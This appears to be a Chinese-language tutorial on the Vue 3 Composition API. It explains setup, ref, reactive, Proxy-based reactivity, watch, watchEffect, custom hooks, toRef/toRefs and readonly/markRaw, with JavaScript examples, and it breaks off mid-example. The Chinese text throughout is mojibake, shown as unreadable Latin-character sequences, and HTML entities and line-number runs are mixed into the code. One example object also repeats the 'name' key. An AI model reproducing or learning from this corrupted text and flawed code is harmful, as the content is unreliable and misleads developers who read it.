å‚³çµ± gruntã€gulpã€webpack èˆ‡ vite æ§‹å»ºå°æ¯”åœ–ï¼š 1 2 3 4 5 6 7 8 9 10 11 ## å‰µå»ºå·¥ç¨‹ npm init vite-app \u0026lt;project-name\u0026gt; ## é€²å…¥å·¥ç¨‹ç›®éŒ„ cd \u0026lt;project-name\u0026gt; ## å®‰è£ä¾è³´ npm install ## å•Ÿå‹• npm run dev å®‰è£ Vue é–‹ç™¼è€…å·¥å…· Vue.js devtools\næ‹‰é–‹åºå¹•çš„ Setup Vue3.0 ä¸­ä¸€å€‹æ–°çš„é…ç½®é …ï¼Œå€¼ç‚ºä¸€å€‹å‡½æ•¸ã€‚ æ˜¯æ‰€æœ‰ Composition API (çµ„åˆå¼API) çš„è¡¨æ¼”èˆå°ã€‚ çµ„ä»¶ä¸­æ‰€ç”¨åˆ°çš„æ•¸æ“šã€æ–¹æ³•ç­‰ç­‰ï¼Œå‡è¦é…ç½®åœ¨ setup ä¸­ã€‚ setup å‡½æ•¸çš„ï¼š è‹¥è¿”å›ä¸€å€‹å°è±¡ï¼Œå‰‡å°è±¡ä¸­çš„å±¬æ€§ã€æ–¹æ³•ï¼Œåœ¨æ¨¡æ¿ä¸­å‡å¯ç›´æ¥ä½¿ç”¨ã€‚(é‡é»é—œæ³¨!) è‹¥è¿”å›ä¸€å€‹æ¸²æŸ“å‡½æ•¸ï¼Œå‰‡å¯ä»¥è‡ªå®šç¾©æ¸²æŸ“å…§å®¹ã€‚(äº†è§£å³å¯) è¿”å›å°è±¡ 1 2 3 4 5 6 7 8 export default { setup() { const name = \u0026#34;æ¸¬è©¦\u0026#34; return { name } } } è¿”å›æ¸²æŸ“å‡½æ•¸(éœ€å¼•å…¥ h ) 1 2 3 4 5 6 import { h } from \u0026#34;vue\u0026#34; export default { setup() { return () =\u0026gt; { return h(\u0026#39;h1\u0026#39;, \u0026#39;å°šç¡…è°·\u0026#39;)} } } æ³¨æ„ï¼š ä¸è¦èˆ‡Vue2.xé…ç½®æ··ç”¨ã€‚ Vue2.xé…ç½®(dataã€methodsã€computed\u0026hellip;)ä¸­å¯ä»¥è¨ªå•åˆ°setupä¸­çš„å±¬æ€§ã€æ–¹æ³•ï¼Œä½†åœ¨setupä¸­ä¸èƒ½è¨ªå•åˆ°Vue2.xé…ç½®(dataã€methodsã€computed\u0026hellip;)ã€‚ å¦‚æœæœ‰é‡åï¼Œsetupå„ªå…ˆã€‚ setup ä¸èƒ½æ˜¯ä¸€å€‹ async å‡½æ•¸ï¼Œå› ç‚ºè¿”å›å€¼ä¸å†æ˜¯ return çš„å°è±¡ï¼Œè€Œæ˜¯ä¸€å€‹ promiseï¼Œæ¨¡æ¿çœ‹ä¸åˆ° return å°è±¡ä¸­çš„å±¬æ€§ï¼›å¾ŒæœŸå¯ä»¥è¿”å›ä¸€å€‹ Promise å¯¦ä¾‹ï¼Œä½†éœ€è¦ Suspense èˆ‡ ç•°æ­¥çµ„ä»¶(å‹•æ…‹çµ„ä»¶) çš„é…åˆï¼šé»æˆ‘å‰å¾€ Suspense ref å‡½æ•¸ ä½œç”¨ï¼šå®šç¾©ä¸€å€‹éŸ¿æ‡‰å¼çš„æ•¸æ“šã€‚ èªæ³•ï¼š 1 const xxx = ref(initValue) å°‡æ•¸æ“šåŠ å·¥æˆä¸€å€‹ RefImpl (Reference: å¼•ç”¨ï¼›Implete: å¯¦ç¾) = (å¼•ç”¨å¯¦ç¾çš„å¯¦ä¾‹å°è±¡)ã€‚ js ä¸­æ“ä½œæ•¸æ“šï¼šxxx.valueã€‚ æ¨¡æ¿ä¸­è®€å–æ•¸æ“šï¼š\u0026lt;div\u0026gt;{{xxx}}\u0026lt;/div\u0026gt; å‚™è¨»ï¼š æ¥æ”¶çš„æ•¸æ“šå¯ä»¥æ˜¯åŸºæœ¬é¡å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯å°è±¡é¡å‹ã€‚ åŸºæœ¬é¡å‹çš„æ•¸æ“šï¼šéŸ¿æ‡‰å¼ä¾ç„¶æ˜¯é  Object.defineProperty() çš„ get èˆ‡ set å®Œæˆçš„ã€‚ å°è±¡é¡å‹çš„æ•¸æ“šï¼šå…§éƒ¨æ±‚åŠ©äº† Vue3.0 ä¸­çš„ä¸€å€‹æ–°å‡½æ•¸\u0026mdash;- reactive reactive å‡½æ•¸ ä½œç”¨ï¼šå®šç¾©ä¸€å€‹å°è±¡é¡å‹çš„éŸ¿æ‡‰å¼æ•¸æ“š(åŸºæœ¬é¡å‹åˆ¥ç”¨ä»–ï¼Œç”¨refå‡½æ•¸)ã€‚ èªæ³•ï¼š 1 2 3 4 const xxx = reactive({ name: \u0026#34;æ¸¬è©¦\u0026#34;, age: 18 }) æ¥æ”¶ä¸€å€‹å°è±¡æˆ–æ•¸çµ„ï¼Œè¿”å›ä¸€å€‹ä»£ç†å°è±¡(Proxyå°è±¡)ã€‚ reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šæ˜¯æ·±å±¤æ¬¡çš„ã€‚ å…§éƒ¨åŸºæ–¼ ES6 çš„ Proxy å¯¦ç¾ï¼Œé€šéä»£ç†å°è±¡æ“ä½œæºå°è±¡å…§éƒ¨æ•¸æ“šéƒ½æ˜¯éŸ¿æ‡‰å¼çš„ï¼Œä¸¦é€šé Reflect æ“ä½œæºå°è±¡å…§éƒ¨çš„æ•¸æ“šã€‚ jsã€æ¨¡æ¿ä¸­æ“ä½œæ•¸æ“šå‡ä¸éœ€è¦ .value Vue 2.0 ä¸­çš„éŸ¿æ‡‰å¼åŸç† å¯¦ç¾åŸç†ï¼š å°è±¡é¡å‹ï¼šé€šé Object.defineProperty() å°å±¬æ€§çš„è®€å–ã€ä¿®æ”¹é€²è¡Œæ””æˆª(æ•¸æ“šåŠ«æŒ)ã€‚ æ•¸çµ„é¡å‹ï¼šé€šéé‡å¯«æ›´æ–°æ•¸çµ„çš„ä¸€ç³»åˆ—æ–¹å¼ä¾†å¯¦ç¾æ””æˆªã€‚(å°æ•¸çµ„çš„è®Šæ›´æ–¹æ³•é€²è¡Œäº†åŒ…è£¹)ã€‚ 1 2 3 4 5 6 7 8 Object.defineProperty(data, \u0026#34;count\u0026#34;, { get() { }, set() { } }) åŸç†æ¨¡æ“¬ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 let person = { name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18 } // æ¨¡æ“¬ Vue2 ä¸­å¯¦ç¾éŸ¿æ‡‰å¼ let p = {} Object.defineProperty(p, \u0026#34;name\u0026#34;, { configurable: true, // å…è¨±åˆªé™¤ï¼Œä½†æ•ç²ä¸åˆ° get() { // æœ‰äººè®€å– name æ™‚èª¿ç”¨ return person.name }, set(value) { console.log(\u0026#34;æœ‰äººä¿®æ”¹äº† name å±¬æ€§ï¼Œæˆ‘ç™¼ç¾äº†ã„›ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢ï¼\u0026#34;) person.name = value } }) Object.defineProperty(p, \u0026#34;age\u0026#34;, { configurable: true, // å…è¨±åˆªé™¤ï¼Œä½†æ•ç²ä¸åˆ° get() { // æœ‰äººè®€å– age æ™‚èª¿ç”¨ return person.age }, set(value) { console.log(\u0026#34;æœ‰äººä¿®æ”¹äº† age å±¬æ€§ï¼Œæˆ‘ç™¼ç¾äº†ã„›ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢ï¼\u0026#34;) person.age = value } }) å­˜åœ¨å•é¡Œï¼š æ–°å¢å±¬æ€§ã€åˆªé™¤å±¬æ€§ï¼Œä»‹é¢ä¸æœƒæ›´æ–°ï¼Œéœ€ä½¿ç”¨ $setã€$deleteã€‚ ç›´æ¥é€šéä¸‹æ¨™ä¿®æ”¹æ•¸çµ„ï¼Œä»‹é¢ä¸æœƒæ›´æ–°ï¼Œéœ€ä½¿ç”¨ $setã€$deleteã€‚ å•é¡Œæƒ…æ³æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 export default { data() { return { person: { name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, hobby: [\u0026#34;å­¸ç¿’\u0026#34;, \u0026#34;åƒé£¯\u0026#34;] } } }, methods: { addSex() { this.person.sex = \u0026#34;å¥³\u0026#34; // æ­¤æ™‚ç•«é¢ä¸æœƒæ›´æ–° this.$set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;å¥³\u0026#34;) // éœ€ä½¿ç”¨ $set ç•«é¢æ‰æœƒæ›´æ–° // æˆ–æ˜¯ä½¿ç”¨ Vue.set() // Vue.set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;å¥³\u0026#34;) }, deleteName() { delete this.person.name // æ­¤æ™‚ç•«é¢ä¸æœƒæ›´æ–° this.$delete(this.person, \u0026#34;name\u0026#34;) // éœ€ä½¿ç”¨ $delete ç•«é¢æ‰æœƒæ›´æ–° // æˆ–æ˜¯ä½¿ç”¨ Vue.delete() // Vue.delete(this.person, \u0026#34;name\u0026#34;) }, updateHobby() { this.person.hobby[0] = \u0026#34;é€›è¡—\u0026#34; // æ­¤æ™‚ç•«é¢ä¸æœƒæ›´æ–° this.$set(this.person.hobby, 0, \u0026#34;é€›è¡—\u0026#34;) // éœ€ä½¿ç”¨ $set ç•«é¢æ‰æœƒæ›´æ–° // æˆ–æ˜¯ä½¿ç”¨ splice() // this.person.hobby.splice(0, 1, \u0026#34;é€›è¡—\u0026#34;) } } } Vue 3.0 ä¸­çš„éŸ¿æ‡‰å¼åŸç† å¯¦ç¾åŸç†ï¼š é€šé Proxy(ä»£ç†)ï¼šæ””æˆªå°è±¡ä¸­ä»»æ„å±¬æ€§çš„è®ŠåŒ–ï¼ŒåŒ…å«å±¬æ€§å€¼çš„è®€å¯«ã€å±¬æ€§çš„æ–°å¢ã€å±¬æ€§çš„åˆªé™¤ç­‰ã€‚ é€šé Reflect(åå°„)ï¼šå°è¢«ä»£ç†å°è±¡çš„å±¬æ€§é€²è¡Œæ“ä½œã€‚ åŸç†æ¨¡æ“¬ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 let person = { name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18 } // æ¨¡æ“¬ Vue3 ä¸­å¯¦ç¾éŸ¿æ‡‰å¼ const p = new Proxy(person, { // æœ‰äººè®€å–pçš„æŸå€‹å±¬æ€§æ™‚èª¿ç”¨ get(target, propName) { console.log(`æœ‰äººè®€å–äº†pèº«ä¸Šçš„${propName}å±¬æ€§`) return Reflect.get(target, propName) }, // æœ‰äººæ–°å¢æˆ–ä¿®æ”¹pçš„æŸå€‹å±¬æ€§æ™‚èª¿ç”¨ set(target, propName, value) { console.log(`æœ‰äººä¿®æ”¹äº†pèº«ä¸Šçš„${propName}å±¬æ€§ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢äº†ï¼`) Reflect.set(target, propName, value) }, // æœ‰äººåˆªé™¤pçš„æŸå€‹å±¬æ€§æ™‚èª¿ç”¨ deleteProperty(target, propName) { console.log(`æœ‰äººåˆªé™¤äº†pèº«ä¸Šçš„${propName}å±¬æ€§ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢äº†ï¼`) return Reflect.deleteProperty(target, propName) } }) setup çš„å…©å€‹æ³¨æ„é» setup åŸ·è¡Œçš„æ™‚æ©Ÿï¼šåœ¨ beforeCreate ä¹‹å‰åŸ·è¡Œä¸€æ¬¡ï¼Œthis æ˜¯ undefinedã€‚ setup çš„åƒæ•¸ propsï¼šå€¼ç‚ºå°è±¡ï¼ŒåŒ…å«ï¼šçµ„ä»¶å¤–éƒ¨å‚³ééä¾†ï¼Œä¸”çµ„ä»¶å…§éƒ¨è²æ˜æ¥æ”¶äº†çš„å±¬æ€§ã€‚ contextï¼šä¸Šä¸‹æ–‡å°è±¡ï¼š attrsï¼šå€¼ç‚ºå°è±¡ï¼ŒåŒ…å«ï¼šçµ„ä»¶å¤–éƒ¨å‚³ééä¾†ï¼Œä½†æ²’æœ‰åœ¨ props é…ç½®ä¸­è²æ˜çš„å±¬æ€§ï¼Œç›¸ç•¶æ–¼ Vue 2.0 çš„ this.$attrsã€‚ slotsï¼šæ¥æ”¶çš„æ’æ§½å…§å®¹ï¼Œç›¸ç•¶æ–¼ Vue 2.0 çš„ this.$slotsã€‚ emitï¼šåˆ†ç™¼è‡ªå®šç¾©äº‹ä»¶çš„å‡½æ•¸ï¼Œç›¸ç•¶æ–¼ Vue 2.0 çš„ this.$emitã€‚ watch å‡½æ•¸ èˆ‡ Vue 2.0 ä¸­çš„ watch é…ç½®åŠŸèƒ½ä¸€è‡´ã€‚ å…©å€‹å°\u0026quot;å‘\u0026quot;ï¼š ç›£è¦– ref å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šæ™‚ï¼Œä¸éœ€åŠ  .valueã€‚ ç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šæ™‚ï¼ŒoldValue ç„¡æ³•æ­£ç¢ºæ•ç²ã€å¼·åˆ¶é–‹å•Ÿäº†æ·±åº¦ç›£è¦–(deepé…ç½®å¤±æ•ˆ)ã€‚ ç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šä¸­çš„æŸå€‹å±¬æ€§æ™‚ï¼Œdeep é…ç½®æœ‰æ•ˆã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import { ref, reactive, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(10) const msg = ref(\u0026#34;æ¸¬è©¦\u0026#34;) const person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // æƒ…æ³ä¸€ï¼šç›£è¦– ref å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“š watch(sum, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sumè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) // æƒ…æ³äºŒï¼šåŒæ™‚ç›£è¦–å¤šå€‹ ref å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“š watch([sum, msg], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sumæˆ–msgè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) /* * æƒ…æ³ä¸‰ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„å…¨éƒ¨å±¬æ€§ * 1. æ³¨æ„: æ­¤æ•¸ç„¡æ³•æ­£ç¢ºçš„ç²å– oldValue * 2. æ³¨æ„: å¼·åˆ¶é–‹å•Ÿäº†æ·±åº¦ç›£è¦–(deepé…ç½®ç„¡æ•ˆ) */ watch(person, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true, deep: false }) // æ­¤è™•çš„ deep é…ç½®ç„¡æ•ˆ // æƒ…æ³å››ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„æŸå€‹å±¬æ€§ watch(() =\u0026gt; person.name, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personçš„nameè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) // æƒ…æ³äº”ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„æŸäº›å±¬æ€§ watch([() =\u0026gt; person.name, () =\u0026gt; person.age], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personçš„nameæˆ–ageè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) // ç‰¹æ®Šæƒ…æ³ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„æŸäº›å°è±¡å±¬æ€§ watch(() =\u0026gt; person.job, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personçš„jobè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true, deep: true }) // æ­¤è™•ç”±æ–¼ç›£è¦–çš„æ˜¯ reactive æ‰€å®šç¾©çš„å°è±¡ä¸­çš„æŸå€‹å±¬æ€§ï¼Œæ‰€ä»¥ deep é…ç½®æœ‰æ•ˆ return { sum, msg } } } watch æ™‚ value çš„å•é¡Œ è‹¥ç›£è¦–çš„æ•¸æ“šç‚º ref æ±‚åŠ© reactive ç”Ÿæˆçš„éŸ¿æ‡‰å¼æ•¸æ“šï¼Œå‰‡å¯ä½¿ç”¨ä»¥ä¸‹å…©ç¨®æ–¹å¼é€²è¡Œç›£è¦–ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import { ref, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = ref({ name: \u0026#34;å¼µä¸‰\u0026#34;, name: 18, job: { job1: { salary: 20 } } }) watch(sum, (newValue, oldValue) =\u0026gt; { // ç›£è¦–çš„æ˜¯ sum é€™å€‹ RefImpl æ•¸æ“šï¼Œå› æ­¤ä¸éœ€è¦ .value console.log(\u0026#34;sumçš„å€¼è®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }) // æ–¹æ³•ä¸€: watch(person.value, (newValue, oldValue) =\u0026gt; { // ç›£è¦– person.value çš„ Proxy å°è±¡ console.log(\u0026#34;personçš„å€¼è®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }) // æ–¹æ³•äºŒ: watch(person, (newValue, oldValue) =\u0026gt; { // æ·±åº¦ç›£è¦– person çš„ Proxy å°è±¡çš„å±¬æ€§ console.log(\u0026#34;personçš„å€¼è®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { deep: true }) return { person } } } watchEffect æ™ºèƒ½ç‰ˆ watchï¼Œä¸ç”¨æŒ‡åç›£è¦–å“ªå€‹å±¬æ€§ï¼Œç›£è¦–çš„å›èª¿ä¸­ç”¨åˆ°å“ªå€‹å±¬æ€§ï¼Œå°±ç›£è¦–å“ªå€‹å±¬æ€§(è€Œä¸”æ˜¯æ·±å±¤æ¬¡çš„)ã€‚ watchEffect æœ‰é»åƒ computedï¼š ä½† computed æ³¨é‡è¨ˆç®—å‡ºä¾†çš„å€¼(å›èª¿å‡½æ•¸çš„è¿”å›å€¼)ï¼Œæ‰€ä»¥å¿…é ˆè¦å¯«è¿”å›å€¼ã€‚ è€Œ watchEffect æ›´æ³¨é‡çš„æ˜¯éç¨‹(å›èª¿å‡½æ•¸çš„å‡½æ•¸é«”)ï¼Œæ‰€ä»¥ä¸ç”¨å¯«è¿”å›å€¼ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { ref, reactive, watchEffect } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) watchEffect(() =\u0026gt; { const x1 = sum.value const x2 = person.job.job1.salary console.log(\u0026#34;watchEffect é…ç½®çš„å›èª¿åŸ·è¡Œäº†\u0026#34;) }) } } è‡ªå®šç¾© hook å‡½æ•¸ hook æœ¬è³ªæ˜¯ä¸€å€‹å‡½æ•¸ï¼ŒæŠŠ setup å‡½æ•¸ä¸­ä½¿ç”¨çš„ Composition API é€²è¡Œäº†å°è£ã€‚ é¡ä¼¼æ–¼ vue 2.0 ä¸­çš„ mixinã€‚ è‡ªå®šç¾© hook çš„å„ªå‹¢ï¼šé‡è¤‡ä½¿ç”¨ä»£ç¢¼ï¼Œè®“ setup ä¸­çš„é‚è¼¯æ›´æ¸…æ¥šæ˜“æ‡‚ã€‚ å‘½åé€šå¸¸å»ºè­°ä»¥ \u0026ldquo;use\u0026rdquo; é–‹é ­ï¼Œä¾‹å¦‚ï¼š ä¸€å€‹ç²å–é¼ æ¨™é»æ“Šä½ç½®çš„ hook src/hooks/usePoint.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { reactive, onMounted, onBeforeUnmount} from \u0026#34;vue\u0026#34; export default function() { // ç²å–é¼ æ¨™é»æ“Šä½ç½® ç›¸é—œçš„æ•¸æ“š let point = reactive({ x: 0, y: 0 }) // ç²å–é¼ æ¨™é»æ“Šä½ç½® ç›¸é—œçš„æ–¹æ³• function savePoint(event) { console.log(event.pageX, event.pageY) point.x = event.pageX point.y = event.pageY } // ç²å–é¼ æ¨™é»æ“Šä½ç½® ç›¸é—œçš„ç”Ÿå‘½é€±æœŸé‰¤å­ onMounted(() =\u0026gt; { window.addEventListener(\u0026#34;click\u0026#34;, savePoint) }) onBeforeUnmount(() =\u0026gt; { window.removeEventListener(\u0026#34;click\u0026#34;, savePoint) }) return point } Demo.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 import usePoint from \u0026#34;@/hooks/usePoint\u0026#34; export default { name: \u0026#34;Demo\u0026#34;, setup() { // ä½¿ç”¨è‡ªå®šç¾©çš„ hook const point = usePoint() return { point } } } toRef ä½œç”¨ï¼šå‰µå»ºä¸€å€‹ ref å°è±¡ï¼Œå…¶ value å€¼æŒ‡å‘(å¼•ç”¨)å¦ä¸€å€‹å°è±¡ä¸­çš„æŸå€‹å±¬æ€§(è¿”å›å€¼ç‚ºä¸€å€‹ ObjectRefImpl å°è±¡ï¼Œç‚ºéŸ¿æ‡‰å¼)ã€‚ èªæ³•ï¼š 1 const name = toRef(person, \u0026#34;name\u0026#34;) æ‡‰ç”¨ï¼šè¦å°‡éŸ¿æ‡‰å¼å°è±¡ä¸­çš„æŸå€‹å±¬æ€§å–®ç¨æä¾›çµ¦å¤–éƒ¨ä½¿ç”¨æ™‚ã€‚ æ“´å±•ï¼štoRefs èˆ‡ toRef åŠŸèƒ½ä¸€è‡´ï¼Œä½†å¯ä»¥æ‰¹é‡å‰µå»ºå¤šå€‹ ref å°è±¡ï¼Œèªæ³•ï¼š 1 toRefs(person) ä½¿ç”¨ç¯„ä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { reactive, toRef, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) const name1 = person.name // name1 åƒ…ç‚ºè³¦å€¼ï¼Œç„¡éŸ¿æ‡‰å¼ const name2 = toRef(person, \u0026#34;name\u0026#34;) // name2 çš„å€¼æœƒæŒ‡å‘(å¼•ç”¨) person çš„ name return { // errorsï¼š // name1: person.name, // åƒ…ç‚ºè³¦å€¼ï¼Œç„¡éŸ¿æ‡‰å¼ // name2: ref(person.name) // åˆå§‹å€¼æ­£å¸¸ï¼Œä½†ä¿®æ”¹æ™‚ä¸æœƒæ”¹åˆ° person çš„ nameï¼Œå› ç‚ºæ­¤å¯«æ³•åƒ…æ˜¯å°‡ \u0026#34;ref(pserson.name)\u0026#34; è³¦å€¼çµ¦ name2ï¼Œè€Œéå°‡ name2 æŒ‡å‘ person çš„ name // successï¼š // æ¨¡æ¿ä¸­ä½¿ç”¨ {{ person.name }}...ç­‰ï¼š // person, // ä¸€å€‹ä¸€å€‹çµ¦å‡ºï¼Œæ¨¡æ¿ä¸­ä½¿ç”¨ {{ name }}...ç­‰ï¼š // name: toRef(person, \u0026#34;name\u0026#34;), // age: toRef(person, \u0026#34;age\u0026#34;), // salary: toRef(person.job.job1, \u0026#34;salary\u0026#34;) // ä¸€æ¬¡å…¨çµ¦å‡ºï¼Œæ¨¡æ¿ä¸­å¯ç›´æ¥ä½¿ç”¨ {{ name }}ã€{{ age }}ã€{{ job.job1.salary }} ...toRefs(person) } } } å…¶ä»–çš„ Composition API 1. shallowReactive èˆ‡ shallowRef shallowï¼šæ·ºå±¤çš„ shallowReactiveï¼šåªè™•ç†å°è±¡æœ€å¤–å±¤å±¬æ€§çš„éŸ¿æ‡‰å¼(æ·ºéŸ¿æ‡‰å¼)ã€‚ shallowRefï¼šåªè™•ç†åŸºæœ¬æ•¸æ“šé¡å‹çš„éŸ¿æ‡‰å¼ï¼Œä¸é€²è¡Œå°è±¡çš„éŸ¿æ‡‰å¼è™•ç†ã€‚ ä»€éº¼æ™‚å€™ä½¿ç”¨ï¼Ÿ å¦‚æœæœ‰ä¸€å€‹å°è±¡æ•¸æ“šï¼Œçµæ§‹æ¯”è¼ƒæ·±ï¼Œä½†è®ŠåŒ–æ™‚åªæ˜¯å¤–å±¤å±¬æ€§è®ŠåŒ– =\u0026gt; shallowReactiveã€‚ å¦‚æœæœ‰ä¸€å€‹å°è±¡æ•¸æ“šï¼Œå¾ŒçºŒåŠŸèƒ½ä¸æœƒä¿®æ”¹è©²å°è±¡ä¸­çš„å±¬æ€§ï¼Œè€Œæ˜¯ç”Ÿæˆæ–°çš„å°è±¡ä¾†æ›¿æ› =\u0026gt; shallowRefã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { shallowRef, shallowReactive, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = shallowReactive({ // åªè€ƒæ…®ç¬¬ä¸€å±¤æ•¸æ“šçš„éŸ¿æ‡‰å¼ name: \u0026#34;å¼µä¸‰\u0026#34;, // éŸ¿æ‡‰å¼ age: 18, // éŸ¿æ‡‰å¼ job: { // ééŸ¿æ‡‰å¼ job1: { salary: 20 } } }) let x = shallowRef({ // åŸºæœ¬é¡å‹æ™‚åŒ refï¼Œä½†å°è±¡é¡å‹ä¸æ˜¯éŸ¿æ‡‰å¼(value æœƒè®Šæˆä¸€èˆ¬çš„ Object è€Œä¸æ˜¯ Proxy ) y: 0 }) return { x, ...toRefs(person) } } } 2. readonly èˆ‡ shallowReadonly readonlyï¼šè®“ä¸€å€‹éŸ¿æ‡‰å¼æ•¸æ“šè®Šç‚ºå”¯è®€çš„(æ·±å±¤å”¯è®€)ã€‚ shallowReadonlyï¼šè®“ä¸€å€‹éŸ¿æ‡‰å¼æ•¸æ“šè®Šç‚ºå”¯è®€çš„(æ·ºå±¤å”¯è®€)ã€‚ æ‡‰ç”¨å ´æ™¯ï¼šä¸å¸Œæœ›æ•¸æ“šè¢«ä¿®æ”¹æ™‚ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { ref, reactive, toRefs, readonly, shallowReadonly} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // å°‡ sum è®Šç‚ºå”¯è®€ï¼Œä¿è­·æ•¸æ“šä¸è¢«ä¿®æ”¹ sum = readonly(sum) // å°‡ person çš„æ‰€æœ‰å±¬æ€§è®Šç‚ºå”¯è®€ï¼Œä¿è­·æ‰€æœ‰å±¬æ€§æ•¸æ“šä¸è¢«ä¿®æ”¹ person = readonly(person) // å°‡ person çš„\u0026#34;ç¬¬ä¸€å±¤å±¬æ€§æ•¸æ“š\u0026#34;è®Šç‚ºå”¯è®€(nameã€ageç„¡æ³•ä¿®æ”¹ï¼Œä½† job å¯ä»¥) person = shallowReadonly(person) return { sum, ...toRefs(person) } } } toRaw èˆ‡ markRaw rawï¼šåŸå§‹ã€‚ toRawï¼š ä½œç”¨ï¼šå°‡ä¸€å€‹ç”± reactive ç”Ÿæˆçš„éŸ¿æ‡‰å¼å°è±¡è½‰ç‚ºæ™®é€šå°è±¡ã€‚ æ‡‰ç”¨å ´æ™¯ï¼šç”¨æ–¼è®€å–éŸ¿æ‡‰å¼å°è±¡å°æ‡‰çš„æ™®é€šå°è±¡ï¼Œå°é€™å€‹æ™®é€šå°è±¡çš„æ‰€æœ‰æ“ä½œï¼Œä¸æœƒå¼•èµ·é é¢æ›´æ–°ã€‚ markRawï¼š ä½œç”¨ï¼šæ¨™è¨˜ä¸€å€‹å°è±¡ï¼Œä½¿å…¶æ°¸é ä¸æœƒå†æˆç‚ºéŸ¿æ‡‰å¼å°è±¡ã€‚ æ‡‰ç”¨å ´æ™¯ï¼š æœ‰äº›å€¼ä¸æ‡‰è¢«è¨­ç½®ç‚ºéŸ¿æ‡‰å¼çš„ï¼Œä¾‹å¦‚è¤‡é›œçš„ç¬¬ä¸‰æ–¹é¡åº«ç­‰ã€‚ ç•¶æ¸²æŸ“å…·æœ‰ä¸å¯è®Šæ•¸æ“šæºçš„å¤§åˆ—è¡¨æ™‚ï¼Œè·³ééŸ¿æ‡‰å¼è½‰æ›å¯ä»¥æé«˜æ€§èƒ½ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import { ref, reactive, toRaw, markRaw} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) function showRawPerson() { const p = toRaw(person) console.log(p) // è¿”å›çš„ä¸å†æ˜¯ Proxyï¼Œè€Œæ˜¯ Object } function addCar() { let car = { name: \u0026#34;å¥”é¦³\u0026#34;, price: 40} person.car = markRaw(car) // æ¨™è¨˜ person.car 